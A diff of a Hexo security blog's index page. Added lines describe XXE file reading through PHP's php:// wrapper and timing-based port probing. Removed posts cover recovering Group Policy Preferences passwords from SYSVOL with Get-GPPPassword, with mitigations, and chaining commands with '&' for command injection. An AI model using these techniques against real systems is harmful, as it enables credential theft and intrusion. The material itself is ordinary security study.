class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>正常xml数据测试:</p>
+<p><img src="8.png"></p>
+<p>查看服务器的内容:</p>
+<p><img src="9.png"></p>
+<p>使用php伪协议，打印base64编码后的xxe.php.解码即可看到相应内容。</p>
+<p><img src="10.png"></p>
+<p><img src="11.png"></p>
+<blockquote>
+<p>php伪协议：</p>
+<p>PHP 带有很多内置 URL 风格的封装协议，支持 <code>scheme://...</code> 的语法</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.file.php">file://</a> — 访问本地文件系统</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.http.php">http://</a> — 访问 HTTP(s) 网址</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp://</a> — 访问 FTP(s) URLs</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php">php://</a> — 访问各个输入/输出流（I/O streams）</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a> — 压缩流</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.data.php">data://</a> — 数据（RFC 2397）</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.glob.php">glob://</a> — 查找匹配的文件路径模式</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.phar.php">phar://</a> — PHP 归档</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2://</a> — Secure Shell 2</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.rar.php">rar://</a> — RAR</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.audio.php">ogg://</a> — 音频流</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.expect.php">expect://</a> — 处理交互式的流</li>
+</ul>
+<p>官方文档：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
+</blockquote>
+<p>爆破开放端口时，并无多余提示，但是处理速度不同，解析81端口时，速度明显慢于80端口。</p>
+<p>看请求包和回应包的时间间隔来判断是否开放：</p>
+<p><img src="12.png"></p>
+<p><img src="15.jpg"></p>
 <h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。<br>从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
 <p>一般会从以下方面来防止SQL注入漏洞：</p>
 <ol>
@@ -556,7 +819,7 @@
     <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/22/Broken-Access-Contro/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="swanQ">
       <meta itemprop="description" content="Try & Enjoy">
     </span>
@@ -651,7 +914,7 @@
     <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="swanQ">
       <meta itemprop="description" content="Try & Enjoy">
     </span>
@@ -846,7 +1109,7 @@
     <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/15/2021-04-15/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="swanQ">
       <meta itemprop="description" content="Try & Enjoy">
     </span>
@@ -1085,7 +1348,7 @@
     <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/13/2021-04-13/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="swanQ">
       <meta itemprop="description" content="Try & Enjoy">
     </span>
@@ -1466,7 +1729,7 @@
     <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/01/msf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="swanQ">
       <meta itemprop="description" content="Try & Enjoy">
     </span>
@@ -1623,7 +1886,7 @@
     <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/29/Django-sql/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="swanQ">
       <meta itemprop="description" content="Try & Enjoy">
     </span>
@@ -1738,188 +2001,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/28/domain/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
-      <meta itemprop="name" content="swanQ">
-      <meta itemprop="description" content="Try & Enjoy">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SwanQ's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/28/domain/" class="post-title-link" itemprop="url">域渗透</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-03-28 19:57:57" itemprop="dateCreated datePublished" datetime="2021-03-28T19:57:57+08:00">2021-03-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-03-30 15:39:47" itemprop="dateModified" datetime="2021-03-30T15:39:47+08:00">2021-03-30</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="翻译和复现Attack-Methods-for-Gaining-Domain-Admin-Rights-in-Active-Directory"><a href="#翻译和复现Attack-Methods-for-Gaining-Domain-Admin-Rights-in-Active-Directory" class="headerlink" title="翻译和复现Attack Methods for Gaining Domain Admin Rights in Active Directory"></a>翻译和复现Attack Methods for Gaining Domain Admin Rights in Active Directory</h1><p> 攻击者有很多方法可以获得活动目录中的域管理权限。本篇文章旨在介绍一些目前比较流行的方法。这里描述的 “assume breach”建立在攻击者已经在内部系统上有了立足点，并获得了域用户凭证（即后渗透阶段）。<br>不幸的是，对于大多数企业来说，攻击者从域用户到域管理员往往不需要很长时间。防御者心中的问题是 “这种情况是如何发生的？”。<br>攻击通常从向用户发送鱼叉式钓鱼电子邮件开始，使攻击者能够在目标网络内的计算机上运行代码。一旦攻击者让他们的代码在企业内部运行，第一步就是进行侦察，发现可用资源，从而提升权限，坚持下去，当然还有收集关键信息（通常是一个组织的 “皇冠上的珠宝”）。<br>While the overall process detail varies, the overall theme remains:<br>虽然流程细节各不相同，但总的主题仍然是：<br>恶意软件注入(鱼叉式钓鱼、web漏洞等)<br>内部侦察<br>窃取凭证<br>利用及提权<br>数据访问及过滤<br>后门维持<br>攻击者首先得在企业内部有一个立足点。此外，攻击者通常从攻击者的用户权限提升到本地管理员权限并不是很难。提权利用可以通过利用系统上未打补丁的权限升级漏洞来实现，更为常见的是在SYSVOL（如组策略首选项）中找到本地管理员密码。<br>在2015年举办的BSides, Shakacon, Black Hat, DEF CON, 和 DerbyCon这五个安全会议中，我谈到了本文中的大部分技术。<br>我也在 “The Most Common Active Directory Security Issues and What You Can Do to Fix Them “一文中介绍了其中的一些问题。</p>
-<p>从域用户到域管理员的攻击技术：<br>1.SYSVOL和组策略首选项中的密码<br>这种方法是最简单的，不需要特殊的 “黑客 “工具。攻击者所要做的就是打开Windows资源管理器，搜索域SYSVOL DFS共享中的XML文件。大多数情况下，groups.xml、scheduletasks.xml、Services.xml等XML文件会包含凭证。</p>
-<p>SYSVOL是Active Directory中的域范围共享，AD中所有经过认证的用户都可以读取访问。SYSVOL包含登录脚本、组策略数据和其他需要在有域控制器的任何地方提供的域范围内的数据（因为SYSVOL在所有域控制器之间自动同步和共享）。所有域组策略都存储在这里/DOMAIN&gt; /SYSVOL/<br><DOMAIN>/Policies/</DOMAIN></p>
-<p>当创建一个新的GPP时，会在SYSVOL中创建一个相关的XML文件，里面有相关的配置数据，如果有提供密码，则是AES-256加密、。</p>
-<p>除了在2012年之前，微软在MSDN上公布了AES加密密钥（共享秘密），可以用来解密密码。由于经过认证的用户（任何域用户或受信任域中的用户）都有对SYSVOL的读取权限，因此域中的任何人都可以在SYSVOL共享中搜索包含 “cpassword “的XML文件，该文件是包含AES加密密码的值。<br><img src="/2021/03/28/domain/1.png"><br>通过访问这个XML文件，攻击者可以使用AES私钥来解密GPP密码。PowerSploit函数Get-GPPPassword对于组策略优先级的利用最为有用。以上截图显示了一个类似的PowerShell函数，从SYSVOL中找到的XML文件中加密GPP密码。<br><img src="/2021/03/28/domain/2.png"><br>其他文件类型也可能有内嵌的密码（通常是明文的），如vbs和bat。<br><img src="/2021/03/28/domain/3.jpeg"><br>我们会认为，随着补丁的发布，管理员应该不会再在组策略首选项中放置凭证，但是我在评估客户安全时，仍然会在SYSVOL中发现凭证。</p>
-<p>解决方法：</p>
-<ul>
-<li>在每台用于管理GPO的计算机上安装KB2962486，它可以防止新的凭证被放在组策略首选项中。</li>
-<li>删除SYSVOL中包含密码的现有GPP xml文件。</li>
-<li>不要把密码放在所有经过认证的用户都能访问的文件中。<br>关于这种攻击方法的更多信息在帖子中介绍。Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences.</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/28/sparrow/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
-      <meta itemprop="name" content="swanQ">
-      <meta itemprop="description" content="Try & Enjoy">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SwanQ's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/28/sparrow/" class="post-title-link" itemprop="url">小知识思考</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-03-28 15:26:51" itemprop="dateCreated datePublished" datetime="2021-03-28T15:26:51+08:00">2021-03-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-03 17:13:27" itemprop="dateModified" datetime="2021-05-03T17:13:27+08:00">2021-05-03</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>鉴于经常会有奇怪的思想，故而为自己专门书写这么一篇文章，想到什么记什么。</p>
-<p>包含<strong>任务、所好奇之事</strong>等</p>
-<h2 id="0x02-具现"><a href="#0x02-具现" class="headerlink" title="0x02 具现"></a>0x02 具现</h2><h3 id="1-一次百度涉及-从浏览器输入URL到浏览器显示页面发生了什么？"><a href="#1-一次百度涉及-从浏览器输入URL到浏览器显示页面发生了什么？" class="headerlink" title="1. 一次百度涉及?从浏览器输入URL到浏览器显示页面发生了什么？"></a>1. 一次百度涉及?从浏览器输入URL到浏览器显示页面发生了什么？</h3><ol>
-<li><p><strong>输入地址</strong><br>输入地址时，浏览器其实已经开始只能匹配URL，用于补全。当然如果有缓存，直接从缓存中展示网页。</p>
-</li>
-<li><p><strong>浏览器查找域名IP</strong><br>查看本地hosts文件，查看其中是否有与此域名对应的规则，如果有，则直接用此IP；<br>若无，向本地DNS服务器(自己网络接入服务器商所提供)发出请求，服务器会查询其缓存记录；<br>若无，本地服务器向DNS根服务器查询；<br>若无，根据跟服务器给出的域服务器地址，让本地DNS服务器去找域服务器；<br>.com域服务器返回本地服务器的域名解析服务器的地址；<br>本地服务器向域名解析服务器发出请求，收到域名与IP地址的对应关系。并保存于缓存中用于下次快速访问。</p>
-</li>
-<li><p><strong>浏览器向web服务器发送HTTP请求</strong><br>浏览器以随机端口[1024-65535]向服务器的web服务(nginx、httpd)80端口发起TCP连接请求。通过多种路由设备，进入网卡，然后进入到内核的TCP/IP协议栈对该包进行解封。可能还要经过Netfilter防火墙(内核模块的过滤)<br>，最终到达web程序，建立TCP连接。常称TCP三次握手。<br>建立TCP连接后，发起HTTP请求。GET、POST、PUT 和 DELETE 、HEAD、OPTION以及 TRACE。<br>http请求一般包含三部分：请求方法URL协议/版本(第一行)、请求头(Request Header)、请求正文。<br>请求头和请求正文之前存在一个空行，表示请求头已经结束，接下来的是请求正文</p>
-</li>
-<li><p><strong>服务器的永久重定向响应</strong><br>server给浏览器响应一个301永久重定向响应，301永久重定向：把带www的和不带www的访问地址归到同一个网站排名下</p>
-</li>
-<li><p><strong>浏览器跟踪重定向地址</strong><br>浏览器知道<a target="_blank" rel="noopener" href="http://www.google.com/">http://www.google.com/</a> 是访问的正确地址，所以发送另一个http请求。</p>
-</li>
-<li><p><strong>服务器处理请求</strong><br>后端从固定端口接收TCP报文，处理TCP连接，解析HTTP协议，按照报文格式封装成供上层使用的HTTP Request对象；<br>大网站使用反向代理服务器时，客户端先请求到nginx，nginx再请求应用服务器，最后将结果返回给客户端，Nginx是反向代理服务器。以免某台服务器down了，影响用户使用。<br><img src="/2021/03/28/sparrow/3.jpg"></p>
-</li>
-<li><p><strong>服务器返回一个HTTP响应</strong><br>HTTP响应与HTTP请求相似，由3个部分构成:状态行、响应头(Response Header)、响应正文</p>
-</li>
-</ol>
-<ol start="8">
-<li><strong>浏览器显示 HTML</strong><br>WebKit引擎渲染的过程：<br>解析html以构建dom树 -&gt; 构建render树 -&gt; 布局render树 -&gt; 绘制render树</li>
-<li><strong>浏览器发送请求获取嵌入在 HTML 中的资源（如图片、音频、视频、CSS、JS等等）</strong></li>
-</ol>
-<ul>
-<li><p>DNS负载均衡<br>针对请求资源膨胀的情况，为了防止机子down掉。<br>原理：在DNS服务器中为同一个主机名配置多个IP地址，在应答DNS查询时，将DNS文件中主机记录的IP地址按顺序访问返回不同的解析结果。使得不同客户端访问不同服务器，从而能达到负载均衡的目的。</p>
-</li>
-<li><p>为什么需要三次握手？</p>
-</li>
-</ul>
-<p><strong>第一次握手：</strong>client将标志位SYN置为1,随机产生一个值为seq=J（J的取值范围为=1234567）的数据包到服务器，client进入SYN_SENT状态，等待server确认；</p>
-<p><strong>第二次握手：</strong>server收到数据包后由标志位SYN=1知道client请求建立连接，server将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给client以确认连接请求，server进入SYN_RCVD状态。</p>
-<p><strong>第三次握手：</strong>client收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给server，server检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，client和server进入ESTABLISHED状态，完成三次握手，随后client与server之间可以开始传输数据了。</p>
-<p>三次握手”的目的是为了<strong>防止已失效的连接请求报文段突然又传送到了服务端，产生错误。</strong><br>某滞留请求延迟发给服务端，服务器返回确认报文，若是client一直不确认，server会一直等待，造成资源浪费。<br><img src="/2021/03/28/sparrow/1.jpg"></p>
-<ul>
-<li>为什么需要四次挥手？</li>
-<li><em>第一次挥手：</em>* Client发送一个FIN，用来关闭Client到Server的数据传送，Client进入FIN_WAIT_1状态。</li>
-</ul>
-<p><strong>第二次挥手：</strong> Server收到FIN后，发送一个ACK给Client，确认序号为收到序号+1（与- SYN相同，一个FIN占用一个序号），Server进入CLOSE_WAIT状态。</p>
-<p><strong>第三次挥手：</strong> Server发送一个FIN，用来关闭Server到Client的数据传送，Server进入LAST_ACK状态。</p>
-<p><strong>第四次挥手：</strong> Client收到FIN后，Client进入TIME_WAIT状态，接着发送一个ACK给Server，确认序号为收到序号+1，Server进入CLOSED状态，完成四次挥手。<br>四次挥手，在server收到对方的FIN时，表示client不再发送数据，但是还可以接收server的数据。所以将ACK和FIN分开发送。<br><img src="/2021/03/28/sparrow/2.jpg"></p>
-<h3 id="3-命令"><a href="#3-命令" class="headerlink" title="3.命令"></a>3.命令</h3><p>tar xzvf<br>sudo ufw disable</p>
-<p>mv用来改名哦.cp更靠谱一点</p>
-<h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><p>对于命令注入不过滤参数的：&amp;</p>
-<p><img src="/2021/03/28/sparrow/4.jpg"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1981,8 +2062,6 @@
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="swanQ"
-      src="/images/author.jpg">
   <p class="site-author-name" itemprop="name">swanQ</p>
   <div class="site-description" itemprop="description">Try & Enjoy</div>
 </div>
@@ -1991,7 +2070,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-count">15</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2000,23 +2079,11 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-count">37</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
 </div>
-  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
-    聊天
-  </a>
-  </div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-        <a href="mailto:zhuoma.swanq@foxmail.com" title="E-Mail → mailto:zhuoma.swanq@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-  </div>
-  <div class="cc-license motion-element" itemprop="license">
-    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
-  </div>
 
 
 
@@ -2045,7 +2112,7 @@
   </span>
   <span class="author" itemprop="copyrightHolder">swanQ</span>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
 
         
@@ -2062,7 +2129,6 @@
   </div>
 
   
-  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
   <script src="/lib/anime.min.js"></script>
   <script src="/lib/velocity/velocity.min.js"></script>
   <script src="/lib/velocity/velocity.ui.min.js"></script>
@@ -2072,7 +2138,7 @@
 <script src="/js/motion.js"></script>
 
 
-<script src="/js/schemes/pisces.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
 <script src="/js/next-boot.js"></script>
@@ -2099,17 +2165,6 @@
   
 
   
-  <script src="//cdn.jsdelivr.net/npm/quicklink@1/dist/quicklink.umd.js"></script>
-  <script>
-      window.addEventListener('load', () => {
-      quicklink({
-        timeout : 3000,
-        priority: true,
-        ignores : [uri => uri.includes('#'),uri => uri === 'http://swanq.top/',]
-      });
-      });
-  </script>
 
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
-<script type="text/javascript" src="/js/src/clicklove.js"></script>
 </html>
